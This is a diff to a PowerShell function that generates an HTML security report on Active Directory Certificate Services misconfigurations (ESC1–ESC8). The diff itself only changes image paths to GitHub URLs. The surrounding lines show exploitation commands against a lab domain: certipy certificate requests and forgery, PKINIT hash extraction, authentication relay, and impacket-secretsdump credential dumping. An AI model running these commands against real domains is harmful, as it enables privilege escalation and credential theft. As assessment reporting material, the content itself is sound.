@@ -108,7 +108,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC1-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC1-1.png"
                                                         alt="Finding ESC1">
                                                 </span>
                                             </div>
@@ -121,7 +121,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC1-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC1-2.png"
                                                         alt="Exploiting ESC1">
                                                 </span>
                                             </div>
@@ -207,7 +207,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC2-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC2-1.png"
                                                         alt="Finding ESC1">
                                                 </span>
                                             </div>
@@ -222,7 +222,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC2-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC2-2.png"
                                                         alt="Exploiting ESC1">
                                                 </span>
                                             </div>
@@ -309,7 +309,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC3-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC3-1.png"
                                                         alt="Finding ESC3">
                                                 </span>
                                             </div>
@@ -324,7 +324,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC3-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC3-2.png"
                                                         alt="Exploiting ESC3">
                                                 </span>
                                             </div>
@@ -429,7 +429,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC4-1.png"
                                                         alt="Finding ESC4">
                                                 </span>
                                             </div>
@@ -444,7 +444,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC4-2.png"
                                                         alt="Exploiting ESC4">
                                                 </span>
                                             </div>
@@ -528,7 +528,7 @@ function Generate-PKIhtml {
                                                     <p>1. A low-privileged user can search for rogue permissions such as GenericWrite, GenericAll or WriteDacl over CA objects using bloodhound.</p> 
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
                                                 </span>
                                             </div>
                                             <hr>
@@ -541,7 +541,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn out.ccache</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
                                                 </span>
                                             </div>
                                             <hr>
@@ -552,7 +552,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 getnthash.py -key 07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9 test.local/'ca$'</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
                                                 </span>
                                             </div>
                                             <hr>
@@ -567,7 +567,7 @@ function Generate-PKIhtml {
 
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
                                                 </span>
                                             </div>
                                             <hr>
@@ -580,7 +580,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn administrator@test.local -subject 'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-5.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-5.png"
                                                         alt="Finding ESC5">
                                                 </span>
                                             </div>
@@ -596,7 +596,7 @@ function Generate-PKIhtml {
                                                     <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC5-6.png" alt="Exploiting ESC5">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-6.png" alt="Exploiting ESC5">
                                                 </span>
                                             </div>
                                         </td>
@@ -680,7 +680,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
                                                 </span>
                                             </div>
                                             <hr>
@@ -693,7 +693,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC6-2.png" alt="Exploiting ESC6">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC6-2.png" alt="Exploiting ESC6">
                                                 </span>
                                             </div>
                                         </td>
@@ -776,7 +776,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
                                                 </span>
                                             </div>
                                             <hr>
@@ -789,7 +789,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template SubCA -upn administrator@test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC7-2.png" alt="Exploiting ESC7">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-2.png" alt="Exploiting ESC7">
                                                 </span>
                                             </div>
                                             <hr>
@@ -805,7 +805,7 @@ function Generate-PKIhtml {
                                                     <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC7-3.png" alt="Exploiting ESC7">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC7-3.png" alt="Exploiting ESC7">
                                                 </span>
                                             </div>
                                         </td>
@@ -891,7 +891,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-1.png"
                                                         alt="Finding ESC8">
                                                 </span>
                                             </div>
@@ -907,7 +907,7 @@ function Generate-PKIhtml {
                                                         192.168.10.130 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-2.png"
                                                         alt="Coercing authentication">
                                                 </span>
                                             </div>
@@ -927,7 +927,7 @@ function Generate-PKIhtml {
                                                     <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :1ee19a386bc9a3f08522b038e4ae0add</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC8-3.png"
                                                         alt="Relaying authentication to ADCS web endpoint">
                                                 </span>
                                             </div>
